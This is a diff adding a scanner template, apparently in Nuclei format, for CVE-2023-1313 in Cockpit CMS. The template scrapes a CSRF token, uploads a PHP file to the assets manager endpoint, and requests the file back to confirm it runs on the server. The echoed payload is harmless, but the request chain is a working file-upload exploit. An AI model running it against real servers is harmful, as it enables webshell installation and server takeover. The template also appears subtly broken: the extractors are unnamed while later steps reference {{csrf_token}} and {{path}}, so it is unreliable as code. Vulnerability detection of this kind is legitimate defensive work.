@@ -1,0 +1,74 @@
+id: cve-2023-1313
+info:
+  name: Cockpit Assetsmanager File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Cockpit has a file upload vulnerability, which allows attackers to upload arbitrary files,
+    leading to server control and backdoor installation.
+  reference:
+    - https://huntr.dev/bounties/f73eef49-004f-4b3b-9717-90525e65ba61/
+    - https://github.com/cockpit-hq/cockpit
+  classification:
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 7.2
+    cve-id: CVE-2023-1313
+  tags: file-upload
+
+variables:
+  boundary: "---------------------------{{rand_text_alphanumeric(20)}}"
+  random_filename: "{{rand_base(6)}}.php"
+  random_content: "<?php echo 'hello'; ?>"
+
+http:
+  - id: get-csrf-token
+    method: GET
+    path:
+      - "/auth/login?to=/"
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'csfr\s*:\s*"([a-zA-Z0-9]+)"'
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - 'csfr\s*:\s*"([a-zA-Z0-9]+)"'
+        group: 1
+        internal: true
+
+  - id: upload-file
+    method: POST
+    path:
+      - "/assetsmanager/upload"
+    headers:
+      Content-Type: "multipart/form-data; boundary={{boundary}}"
+      Cookie: "{{csrf_token}}"
+    body: |
+      --{{boundary}}
+      Content-Disposition: form-data; name="files[]"; filename="{{random_filename}}"
+      Content-Type: text/php
+
+      {{random_content}}
+      --{{boundary}}--
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - '"path":"([^"]+)"'
+        group: 1
+        internal: true
+
+  - id: validate-upload
+    method: GET
+    path:
+      - "/storage/uploads/{{path}}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "hello"
+      - type: status
+        status:
+          - 200
